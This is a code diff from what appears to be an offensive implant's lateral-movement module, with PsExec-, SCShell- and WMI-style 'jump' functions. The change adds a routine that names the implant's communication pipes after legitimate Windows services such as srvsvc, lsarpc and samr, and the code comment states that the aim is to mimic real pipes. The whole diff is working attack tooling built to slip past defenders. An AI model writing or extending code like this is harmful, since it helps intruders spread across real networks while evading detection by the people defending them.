@@ -1000,16 +1000,34 @@ typedef BOOL      (WINAPI *fn_DeleteFileW)(LPCWSTR);
 static BOOL _jump_autolink(Buffer *out, const wchar_t *target, const char *pipename);
 
 /* Generate pseudo-random alphanumeric name */
-static void _jump_randname(char *buf, int len) {
-    static const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
+static DWORD _jump_seed(void) {
     LARGE_INTEGER ctr;
     QueryPerformanceCounter(&ctr);
-    DWORD seed = ctr.LowPart ^ GetCurrentThreadId();
+    return ctr.LowPart ^ GetCurrentThreadId();
+}
+
+static void _jump_randname(char *buf, int len) {
+    static const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
+    DWORD seed = _jump_seed();
     for (int i = 0; i < len; i++) {
         seed = seed * 1103515245 + 12345;
         buf[i] = charset[(seed >> 16) % (sizeof(charset) - 1)];
     }
     buf[len] = '\0';
+}
+
+/* Generate pipe name that mimics legitimate Windows named pipes.
+ * Format: <prefix>_<hex4> — e.g. "srvsvc_a3f1", "epmapper_02dc" */
+static void _jump_pipe_name(char *buf, int bufsize) {
+    static const char *prefixes[] = {
+        "srvsvc", "wkssvc", "epmapper", "lsarpc", "samr",
+        "spoolss", "netdfs", "atsvc", "browser", "trkwks",
+    };
+    DWORD seed = _jump_seed();
+    int idx = seed % 10;
+    seed = seed * 1103515245 + 12345;
+    DWORD suffix = (seed >> 8) & 0xFFFF;
+    snprintf(buf, bufsize, "%s_%04x", prefixes[idx], suffix);
 }
 
 static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
@@ -1083,7 +1101,7 @@ static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
     /* 3. Create service with random name */
     char pipe_name[32] = {0};
     if (chained) {
-        _jump_randname(pipe_name, 12);
+        _jump_pipe_name(pipe_name, sizeof(pipe_name));
     }
 
     wchar_t svcName[16], binPath[512];
@@ -1259,7 +1277,7 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
     /* Chained mode: generate pipe name early so binPath can include it */
     char pipe_name[32] = {0};
     if (chained) {
-        _jump_randname(pipe_name, 12);
+        _jump_pipe_name(pipe_name, sizeof(pipe_name));
     }
 
     wchar_t newBinPath[512];
@@ -1663,7 +1681,7 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
     /* Set CommandLine = "C:\Windows\Temp\<rand>.exe [PIPE:<name>]" */
     char pipe_name[32] = {0};
     if (chained) {
-        _jump_randname(pipe_name, 12);
+        _jump_pipe_name(pipe_name, sizeof(pipe_name));
     }
 
     wchar_t cmdLine[512];
